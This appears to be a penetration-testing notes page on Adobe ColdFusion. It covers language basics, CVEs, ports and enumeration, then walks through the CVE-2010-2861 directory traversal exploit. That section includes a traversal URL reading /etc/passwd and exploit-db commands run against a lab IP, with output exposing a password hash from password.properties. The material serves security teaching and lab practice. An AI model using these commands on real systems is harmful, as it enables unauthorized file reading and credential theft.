# ColdFusion

Coldfusion is a Java-based Programming Language and Web App development platform used to build dyanmic and interactive web applications that can be integrated with various API's and databases.

CMFL 9ColdFusion Markup Language) is the proprietary language used by Coldfusion with a similar syntax to HTML. It uses tags and functions within the CMFL reducing the amount of code needing to be written. For example cfquery can execute SQL satements:

```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

cfloop can loop through data that was retrieved via cfquery:

```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```

cfloop supports other programming languages i.e java and javascript as well.

Colfusion has had a number of CVE's:

1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

#### ColdFusion Ports:

| Port Number | Protocol       | Description                                                                                                                                                            |
| ----------- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80          | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                         |
| 443         | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                          |
| 1935        | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device. |
| 25          | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                               |
| 8500        | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                           |
| 5500        | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                               |

### Enumeration

Port Scanning - Typically uses default HTTP ports, nmap may be able to identify coldfusion services.

File Extensions - Typically uses .cfm or .cfc file extensions, pages with these extensions indicate a coldfusion environment&#x20;

HTTP headers - "Server: ColdFusion" or "X-Powered-By: ColdFusion"

Error Messages - May contain references to coldfusion specific tags or functions&#x20;

Default Files - such as "admin.cfm" or "CFIDE/administrator/index.cfm"

### Attacking Coldfusion

#### Known vulnerabilities&#x20;

Always check for known vulnerabilties.

```shell-session
searchsploit adobe coldfusion
```

#### Directory Traversal

`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

* `CFIDE/administrator/settings/mappings.cfm`
* `logging/settings.cfm`
* `datasources/index.cfm`
* `j2eepackaging/editarchive.cfm`
* `CFIDE/administrator/enter.cfm`

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.

example payload:

```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

```

Exploitation:

<pre><code>searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
<strong>    usage: 14641.py &#x3C;host> &#x3C;port> &#x3C;file_path>
</strong>    example: 14641.py localhost 80 ../../../../../../../lib/password.properties
    if successful, the file will be printed
    
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6&#x26; \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
</code></pre>

password.properties: configuration file in ColdFusion that stores encypted passwords for services and resources that coldfusion uses. These can be used for database connections, mail servers, ldap, etc. The file is usually in the `[cf_root]/lib` directory and can be managed through the ColdFusion Administrator.

{% embed url="https://www.rapid7.com/db/modules/auxiliary/gather/coldfusion_pwd_props/" %}

#### Un-Authenticated RCE&#x20;
